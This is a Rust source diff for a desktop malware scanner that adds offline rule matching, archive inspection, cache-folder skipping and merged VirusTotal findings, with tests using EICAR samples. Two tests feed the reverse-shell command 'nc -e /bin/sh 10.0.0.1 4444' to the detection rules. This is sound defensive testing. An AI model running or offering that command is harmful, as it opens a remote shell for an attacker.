@@ -1,4 +1,9 @@
-//! Hashing files and asking VirusTotal what it knows about them.
+//! Hashing files, running the rules over them, and asking VirusTotal what it
+//! knows about them.
+//!
+//! The rules and the archive reader live in `rules.rs` and `content.rs` and
+//! need nothing from outside the machine. What they found is cached beside the
+//! hash and thrown away when the rules change.
 //!
 //! Hashing is streamed in 8 KB blocks, so a 4 GB file costs 8 KB of memory,
 //! and a file whose size and modification time are unchanged is never read.
@@ -22,6 +27,7 @@ use tokio::time::Instant;
 use walkdir::WalkDir;
 
 use crate::config::Config;
+use crate::content::{self, ContentReport, Unchecked};
 use crate::db;
 use crate::state::{Action, Finding, Issue, IssueKind, IssueTarget, Severity};
 
@@ -66,7 +72,7 @@ const INTERESTING_EXTENSIONS: &[&str] = &[
     // programs and installers
     "sh", "bash", "zsh", "run", "appimage", "deb", "rpm", "exe", "msi", "bat", "cmd", "com", "scr",
     "jar", "apk", "dmg", "pkg", "bin", "elf", "so", "dll", "ps1", "vbs", "js", "py", "pl", "rb",
-    "php", "desktop", "service",
+    "php", "desktop", "service", "reg", "hta", "wsf", "jse", "vbe",
     // archives, because what is inside them is usually the point
     "zip", "gz", "tgz", "bz2", "xz", "7z", "rar", "tar", "iso", "img", "cab", "lz", "zst",
 ];
@@ -82,6 +88,26 @@ pub fn is_interesting(path: &Path, executable: bool, deep: bool) -> bool {
     };
     let ext = ext.to_ascii_lowercase();
     INTERESTING_EXTENSIONS.contains(&ext.as_str())
+}
+
+/// The first line of every CACHEDIR.TAG, from the Cache Directory Tagging
+/// Specification. Cargo, pip and most build tools write it.
+const CACHEDIR_SIGNATURE: &[u8] = b"Signature: 8a477f597d28d172789f06886806bc55";
+
+/// Whether a folder holds generated files rather than anything a person put
+/// there.
+pub fn is_noise(dir: &Path, skip: &[String]) -> bool {
+    let named = dir
+        .file_name()
+        .and_then(|name| name.to_str())
+        .is_some_and(|name| skip.iter().any(|s| s == name));
+    named || has_cachedir_tag(dir)
+}
+
+fn has_cachedir_tag(dir: &Path) -> bool {
+    let Ok(file) = std::fs::File::open(dir.join("CACHEDIR.TAG")) else { return false };
+    let mut head = Vec::with_capacity(CACHEDIR_SIGNATURE.len());
+    file.take(CACHEDIR_SIGNATURE.len() as u64).read_to_end(&mut head).is_ok() && head == CACHEDIR_SIGNATURE
 }
 
 /// Walks the configured directories and returns what to check, newest first.
@@ -102,7 +128,13 @@ pub fn collect_candidates(paths: &[String], config: &Config) -> Vec<Candidate> {
         // Symlinks are not followed: a link to / would scan the whole disk.
         let walker = WalkDir::new(&root).max_depth(8).follow_links(false).into_iter();
 
-        for entry in walker.filter_entry(|e| e.path() != quarantine).flatten() {
+        // The folder asked for is walked even when its own name is on the list.
+        let keep = |e: &walkdir::DirEntry| {
+            e.path() != quarantine
+                && !(e.depth() > 0 && e.file_type().is_dir() && is_noise(e.path(), &config.skip_folders))
+        };
+
+        for entry in walker.filter_entry(keep).flatten() {
             if !entry.file_type().is_file() {
                 continue;
             }
@@ -123,8 +155,11 @@ pub fn collect_candidates(paths: &[String], config: &Config) -> Vec<Candidate> {
         }
     }
 
+    // Two configured folders can overlap, /tmp holding a download folder for
+    // one, and a file found twice is checked once.
+    let mut seen = std::collections::HashSet::new();
+    out.retain(|candidate| seen.insert(candidate.path.clone()));
     out.sort_by_key(|candidate| std::cmp::Reverse(candidate.mtime));
-    out.dedup_by(|a, b| a.path == b.path);
     out
 }
 
@@ -331,40 +366,101 @@ pub fn severity_for(verdict: &VtVerdict) -> Option<Severity> {
     }
 }
 
-/// Builds the issue for a file that got a verdict.
-pub fn file_finding(path: &str, hash: &str, verdict: &VtVerdict, quarantined: bool) -> Option<Finding> {
-    let severity = severity_for(verdict)?;
+/// Builds the issue for a file from what VirusTotal said, if it was asked,
+/// and what the rules found.
+///
+/// One file makes at most one issue, worded after the strongest evidence:
+/// engines first, then rules, then whatever an archive kept from view.
+pub fn file_finding(
+    path: &str,
+    hash: &str,
+    verdict: Option<&VtVerdict>,
+    content: &ContentReport,
+    quarantined: bool,
+) -> Option<Finding> {
+    let severity = verdict.and_then(severity_for).max(content.severity())?;
+    let flagged = verdict.filter(|v| v.known && v.malicious > 0);
+    let unknown = verdict.is_some_and(|v| !v.known);
 
-    let (kind, title, detail) = if !verdict.known {
-        (
-            IssueKind::UnknownFile,
-            "File unknown to VirusTotal".to_string(),
-            "No engine has ever been shown this file, so there is no verdict \
-             either way. That is normal for something built locally or received \
-             from one person. Sending it for analysis uploads its contents."
-                .to_string(),
-        )
-    } else if verdict.malicious >= 10 {
-        (
-            IssueKind::MaliciousFile,
-            format!("Malicious file: flagged by {} engines", verdict.malicious),
-            format!(
-                "{} of {} engines call this file malicious.",
-                verdict.malicious, verdict.total
-            ),
-        )
+    let mut hits = content.hits.clone();
+    hits.sort_by_key(|hit| std::cmp::Reverse(hit.severity));
+
+    let (kind, title) = if let Some(verdict) = flagged {
+        let word = if verdict.malicious >= 10 { "Malicious" } else { "Suspicious" };
+        (IssueKind::MaliciousFile, format!("{word} file: flagged by {} engines", verdict.malicious))
+    } else if let Some(worst) = hits.first() {
+        let mut title = worst.title.clone();
+        if worst.member.is_some() {
+            title.push_str(", inside the archive");
+        }
+        let others = hits.iter().filter(|h| h.title != worst.title).count();
+        if others > 0 {
+            title.push_str(&format!(", and {others} more"));
+        }
+        (IssueKind::RuleMatch, title)
+    } else if !content.unchecked.is_empty() {
+        let title = if content.unchecked.iter().any(|u| matches!(u, Unchecked::Bomb { .. })) {
+            "Possible decompression bomb"
+        } else if content.unchecked.iter().any(|u| matches!(u, Unchecked::Encrypted { .. })) {
+            "Archive protected by a password"
+        } else {
+            "Archive only partly checked"
+        };
+        (IssueKind::UncheckedArchive, title.to_string())
     } else {
-        (
-            IssueKind::MaliciousFile,
-            format!("Suspicious file: flagged by {} engines", verdict.malicious),
-            format!(
-                "{} of {} engines flag this file{}. A few detections against many clean results are often a heuristic reacting to how the file was packed, but the file is worth a decision either way.",
-                verdict.malicious,
-                verdict.total,
-                if verdict.suspicious > 0 { format!(", and {} more call it suspicious", verdict.suspicious) } else { String::new() }
-            ),
-        )
+        (IssueKind::UnknownFile, "File unknown to VirusTotal".to_string())
     };
+
+    let mut paragraphs: Vec<String> = Vec::new();
+
+    if let Some(verdict) = flagged {
+        paragraphs.push(if verdict.malicious >= 10 {
+            match verdict.total {
+                0 => format!("{} engines call this file malicious.", verdict.malicious),
+                total => format!("{} of {total} engines call this file malicious.", verdict.malicious),
+            }
+        } else {
+            format!(
+                "{} {} flag this file{}. A few detections against many clean results are often a heuristic reacting to how the file was packed, but the file is worth a decision either way.",
+                verdict.malicious,
+                match verdict.total {
+                    0 => "engines".to_string(),
+                    total => format!("of {total} engines"),
+                },
+                if verdict.suspicious > 0 { format!(", and {} more call it suspicious", verdict.suspicious) } else { String::new() }
+            )
+        });
+    }
+
+    for hit in hits.iter().take(10) {
+        let place = match &hit.member {
+            Some(member) => format!(", in {member}"),
+            None => String::new(),
+        };
+        let mut text = format!("{}{place}. {}", hit.title, hit.detail);
+        if let Some(sha256) = &hit.member_sha256 {
+            text.push_str(&format!("\nSHA-256 of that file: {sha256}"));
+        }
+        paragraphs.push(text);
+    }
+    if hits.len() > 10 {
+        paragraphs.push(format!("And {} more matches.", hits.len() - 10));
+    }
+
+    for unchecked in &content.unchecked {
+        paragraphs.push(unchecked.sentence());
+    }
+
+    if unknown {
+        paragraphs.push(
+            "No VirusTotal engine has ever been shown this file, so there is no verdict from them either way. That is normal for something built locally or received from one person. Sending it for analysis uploads its contents."
+                .to_string(),
+        );
+    }
+
+    if quarantined {
+        paragraphs.push("Quarantined automatically, as set in the settings.".to_string());
+    }
 
     let mut actions = Vec::new();
     if quarantined {
@@ -373,17 +469,11 @@ pub fn file_finding(path: &str, hash: &str, verdict: &VtVerdict, quarantined: bo
         actions.push(Action::new("quarantine", "Quarantine", false));
         actions.push(Action::new("delete", "Delete", true));
     }
-    if !verdict.known {
+    if unknown {
         actions.push(Action::new("upload_vt", "Send for analysis", true));
     }
     actions.push(Action::new("trust", "Trust this file", false));
     actions.push(Action::ignore());
-
-    let detail = if quarantined {
-        format!("{detail}\n\nQuarantined automatically, as set in the settings.")
-    } else {
-        detail
-    };
 
     Some(Finding::new(
         Issue {
@@ -391,7 +481,7 @@ pub fn file_finding(path: &str, hash: &str, verdict: &VtVerdict, quarantined: bo
             severity,
             title,
             location: path.to_string(),
-            detail: Some(detail),
+            detail: Some(paragraphs.join("\n\n")),
             actions,
             ..Default::default()
         },
@@ -460,11 +550,23 @@ pub async fn run_scan(
 
     if client.is_none() && api_key.is_none() {
         outcome.notes.push(
-            "No VirusTotal API key is set, so files were hashed but not checked \
-             against any engine. The key goes in Settings."
+            "No VirusTotal API key is set, so files were checked against GRT \
+             Sentry's own rules only, and not against VirusTotal's engines. The \
+             key goes in Settings."
                 .to_string(),
         );
     }
+
+    // Without rules every file would come back unreadable, so the gap is said
+    // once and the contents are left alone.
+    let rules_ready = match crate::rules::ready() {
+        Ok(()) => true,
+        Err(e) => {
+            outcome.notes.push(e);
+            false
+        }
+    };
+    let limits = content::Limits::for_config(config);
 
     let mut budget = config.vt_budget_per_scan;
 
@@ -487,14 +589,19 @@ pub async fn run_scan(
             db::cached_file(&conn, &candidate.path, candidate.size, candidate.mtime)
         };
 
-        let (hash, mut known_verdict) = match cached {
+        let (hash, mut known_verdict, stored_content) = match cached {
             // A verdict older than a week is treated as no verdict.
             Some(entry) => {
                 let fresh = entry
                     .vt_checked
                     .map(|checked| crate::db::now() - checked <= VERDICT_MAX_AGE)
                     .unwrap_or(false);
-                (entry.sha256, entry.vt_verdict.filter(|_| fresh))
+                // Results from older rules are thrown away.
+                let stored = entry
+                    .content
+                    .filter(|_| entry.content_version.as_deref() == Some(crate::rules::version()))
+                    .and_then(|json| serde_json::from_str::<ContentReport>(&json).ok());
+                (entry.sha256, entry.vt_verdict.filter(|_| fresh), stored)
             }
             None => {
                 let path = candidate.path.clone();
@@ -506,7 +613,7 @@ pub async fn run_scan(
                         // Another file with the same contents may already
                         // have an answer worth reusing.
                         let reused = db::verdict_for_hash(&conn, &hash, VERDICT_MAX_AGE);
-                        (hash, reused)
+                        (hash, reused, None)
                     }
                     // Unreadable or gone since the walk, which is not a
                     // finding.
@@ -525,16 +632,35 @@ pub async fn run_scan(
             }
         }
 
-        // 3. The verdict, reused or asked for or postponed.
+        // 3. What is inside, offline, from the cache when the rules have not
+        // changed since.
+        let content = match stored_content {
+            Some(stored) => stored,
+            None if rules_ready => {
+                let path = candidate.path.clone();
+                let limits = limits.clone();
+                let report = tokio::task::spawn_blocking(move || content::inspect(Path::new(&path), &limits))
+                    .await
+                    .unwrap_or_default();
+                if let Ok(json) = serde_json::to_string(&report) {
+                    let conn = db.lock().unwrap();
+                    let _ = db::put_content(&conn, &candidate.path, crate::rules::version(), &json);
+                }
+                report
+            }
+            None => ContentReport::default(),
+        };
+
+        // 4. The verdict, reused or asked for or postponed.
         let verdict = match known_verdict.take() {
-            Some(malicious) => VtVerdict {
+            Some(malicious) => Some(VtVerdict {
                 malicious: malicious.max(0) as u32,
                 suspicious: 0,
                 // The engine count is not cached, so the message omits the
                 // total in this case.
                 total: 0,
                 known: true,
-            },
+            }),
             None => match &client {
                 Some(client) if budget > 0 => {
                     budget -= 1;
@@ -549,7 +675,7 @@ pub async fn run_scan(
                         Ok(verdict) => {
                             let conn = db.lock().unwrap();
                             let _ = db::put_verdict(&conn, &hash, verdict.malicious as i64);
-                            verdict
+                            Some(verdict)
                         }
                         Err(e) => {
                             // A network failure must not abort the scan, and
@@ -559,40 +685,36 @@ pub async fn run_scan(
                             }
                             budget = 0;
                             outcome.queued += 1;
-                            continue;
+                            None
                         }
                     }
                 }
                 Some(_) => {
                     outcome.queued += 1;
-                    continue;
+                    None
                 }
-                None => continue,
+                None => None,
             },
         };
 
-        // 4. What to do about it.
-        if severity_for(&verdict).is_none() {
-            continue;
-        }
-
+        // 5. What to do about it. Only the engines quarantine on their own:
+        // a rule is a reason to look, not to move files.
         let mut quarantined = false;
-        if config.auto_quarantine
-            && verdict.known
-            && verdict.malicious >= config.auto_quarantine_threshold
-        {
-            let conn = db.lock().unwrap();
-            match crate::quarantine::quarantine_file(
-                &conn,
-                &candidate.path,
-                &format!("flagged by {} engines", verdict.malicious),
-            ) {
-                Ok(_) => quarantined = true,
-                Err(e) => outcome.notes.push(format!("Automatic quarantine failed: {e}")),
+        if let Some(verdict) = &verdict {
+            if config.auto_quarantine && verdict.known && verdict.malicious >= config.auto_quarantine_threshold {
+                let conn = db.lock().unwrap();
+                match crate::quarantine::quarantine_file(
+                    &conn,
+                    &candidate.path,
+                    &format!("flagged by {} engines", verdict.malicious),
+                ) {
+                    Ok(_) => quarantined = true,
+                    Err(e) => outcome.notes.push(format!("Automatic quarantine failed: {e}")),
+                }
             }
         }
 
-        if let Some(finding) = file_finding(&candidate.path, &hash, &verdict, quarantined) {
+        if let Some(finding) = file_finding(&candidate.path, &hash, verdict.as_ref(), &content, quarantined) {
             outcome.findings.push(finding);
         }
     }
@@ -706,6 +828,19 @@ mod tests {
     }
 
     #[test]
+    fn overlapping_folders_give_each_file_once() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join("inner")).unwrap();
+        std::fs::write(dir.path().join("inner/a.sh"), b"#!/bin/sh\n").unwrap();
+        std::fs::write(dir.path().join("b.sh"), b"#!/bin/sh\n").unwrap();
+
+        let outer = dir.path().to_string_lossy().into_owned();
+        let inner = dir.path().join("inner").to_string_lossy().into_owned();
+        let found = collect_candidates(&[outer, inner], &Config::default());
+        assert_eq!(found.len(), 2);
+    }
+
+    #[test]
     fn a_missing_directory_is_skipped_rather_than_fatal() {
         let config = Config::default();
         let found = collect_candidates(&["/nonexistent/place".to_string()], &config);
@@ -731,12 +866,84 @@ mod tests {
 
     #[test]
     fn a_file_nobody_has_seen_is_reported_without_a_destructive_default() {
-        let finding = file_finding("/tmp/mine.bin", "abc", &VtVerdict::unknown(), false).unwrap();
+        let finding =
+            file_finding("/tmp/mine.bin", "abc", Some(&VtVerdict::unknown()), &ContentReport::default(), false).unwrap();
         assert_eq!(finding.issue.kind, IssueKind::UnknownFile);
         assert_eq!(finding.issue.severity, Severity::Info);
 
         let upload = finding.issue.actions.iter().find(|a| a.id == "upload_vt").expect("offered");
         assert!(upload.destructive, "uploading contents must ask first");
+    }
+
+    #[test]
+    fn a_rule_match_is_reported_with_no_key_and_named_after_the_rule() {
+        let content = ContentReport { hits: crate::rules::scan_bytes(b"nc -e /bin/sh 10.0.0.1 4444").unwrap(), ..Default::default() };
+        let finding = file_finding("/tmp/x.sh", "abc", None, &content, false).unwrap();
+        assert_eq!(finding.issue.kind, IssueKind::RuleMatch);
+        assert_eq!(finding.issue.severity, Severity::Critical);
+        assert_eq!(finding.issue.title, "Reverse shell");
+        assert!(!finding.issue.actions.iter().any(|a| a.id == "upload_vt"), "no key, nothing to upload to");
+    }
+
+    #[test]
+    fn engines_and_rules_together_make_one_issue_at_the_worse_severity() {
+        let content = ContentReport { hits: crate::rules::scan_bytes(b"nc -e /bin/sh 10.0.0.1 4444").unwrap(), ..Default::default() };
+        let verdict = VtVerdict { malicious: 2, suspicious: 0, total: 70, known: true };
+        let finding = file_finding("/tmp/x.sh", "abc", Some(&verdict), &content, false).unwrap();
+        assert_eq!(finding.issue.kind, IssueKind::MaliciousFile);
+        assert_eq!(finding.issue.severity, Severity::Critical, "the rule is worse than two engines");
+        let detail = finding.issue.detail.unwrap();
+        assert!(detail.contains("2 of 70 engines") && detail.contains("Reverse shell"));
+    }
+
+    #[test]
+    fn a_clean_verdict_and_no_rule_match_make_no_issue() {
+        let verdict = VtVerdict { malicious: 0, suspicious: 0, total: 70, known: true };
+        assert!(file_finding("/tmp/x", "abc", Some(&verdict), &ContentReport::default(), false).is_none());
+        assert!(file_finding("/tmp/x", "abc", None, &ContentReport::default(), false).is_none());
+    }
+
+    #[test]
+    fn a_bomb_is_named_as_one() {
+        let content = ContentReport {
+            unchecked: vec![Unchecked::Bomb { member: "zeros.bin".into(), ratio: 200 }],
+            ..Default::default()
+        };
+        let finding = file_finding("/tmp/x.zip", "abc", None, &content, false).unwrap();
+        assert_eq!(finding.issue.kind, IssueKind::UncheckedArchive);
+        assert_eq!(finding.issue.title, "Possible decompression bomb");
+        assert_eq!(finding.issue.severity, Severity::Warning);
+    }
+
+    #[test]
+    fn generated_folders_are_skipped_but_a_folder_asked_for_by_name_is_not() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        for folder in ["node_modules/pkg", "target/debug", "src"] {
+            std::fs::create_dir_all(root.join(folder)).unwrap();
+        }
+        std::fs::write(root.join("node_modules/pkg/install.sh"), b"#!/bin/sh\n").unwrap();
+        std::fs::write(root.join("target/CACHEDIR.TAG"), b"Signature: 8a477f597d28d172789f06886806bc55\n# cargo\n").unwrap();
+        std::fs::write(root.join("target/debug/build.sh"), b"#!/bin/sh\n").unwrap();
+        std::fs::write(root.join("src/run.sh"), b"#!/bin/sh\n").unwrap();
+
+        let config = Config::default();
+        let found = collect_candidates(&[root.to_string_lossy().into_owned()], &config);
+        let names: Vec<_> = found.iter().map(|c| c.path.clone()).collect();
+        assert_eq!(names.len(), 1, "{names:?}");
+        assert!(Path::new(&names[0]).ends_with("src/run.sh"));
+
+        // Pointed at directly, node_modules is scanned like anything else.
+        let direct = collect_candidates(&[root.join("node_modules").to_string_lossy().into_owned()], &config);
+        assert_eq!(direct.len(), 1);
+    }
+
+    #[test]
+    fn a_cachedir_tag_without_the_signature_hides_nothing() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join("x")).unwrap();
+        std::fs::write(dir.path().join("x/CACHEDIR.TAG"), b"please skip me").unwrap();
+        assert!(!is_noise(&dir.path().join("x"), &[]));
     }
 
     #[test]
@@ -808,10 +1015,45 @@ mod tests {
         assert_eq!(outcome.files_checked, 1);
         assert!(outcome.findings.is_empty(), "no key means no verdict, not a false alarm");
         assert!(outcome.notes.iter().any(|n| n.contains("No VirusTotal API key")));
+        assert!(outcome.notes.iter().any(|n| n.contains("own rules")));
 
         // The hash is in the cache, so the next scan will not read the file.
         let conn = db.lock().unwrap();
         assert_eq!(crate::db::cached_file_count(&conn), 1);
+    }
+
+    #[tokio::test]
+    async fn without_a_network_or_a_key_eicar_is_found_on_its_own_and_inside_an_archive() {
+        let dir = tempfile::tempdir().unwrap();
+        let eicar = crate::rules::samples::eicar();
+        std::fs::write(dir.path().join("eicar.com"), &eicar).unwrap();
+
+        let mut zipped = std::io::Cursor::new(Vec::new());
+        {
+            let mut writer = zip::ZipWriter::new(&mut zipped);
+            writer.start_file("inner/eicar.com", zip::write::SimpleFileOptions::default()).unwrap();
+            writer.write_all(&eicar).unwrap();
+            writer.finish().unwrap();
+        }
+        std::fs::write(dir.path().join("parcel.zip"), zipped.into_inner()).unwrap();
+
+        let db = Mutex::new(crate::db::open_memory());
+        let config = Config { virustotal_api_key: None, ..Default::default() };
+        let limiter = RateLimiter::new();
+        let cancel = AtomicBool::new(false);
+        let paths = [dir.path().to_string_lossy().into_owned()];
+        let scan = || run_scan(&db, &config, &limiter, &cancel, &paths, &|_| {});
+
+        let outcome = scan().await;
+        assert_eq!(outcome.findings.len(), 2);
+        assert!(outcome.findings.iter().all(|f| f.issue.kind == IssueKind::RuleMatch));
+        let archive = outcome.findings.iter().find(|f| f.issue.location.ends_with("parcel.zip")).unwrap();
+        assert!(archive.issue.title.contains("inside the archive"));
+        assert!(archive.issue.detail.as_ref().unwrap().contains("inner/eicar.com"));
+
+        // The second scan reads the answer from the cache and gives the same one.
+        let again = scan().await;
+        assert_eq!(again.findings.len(), 2);
     }
 
     #[tokio::test]
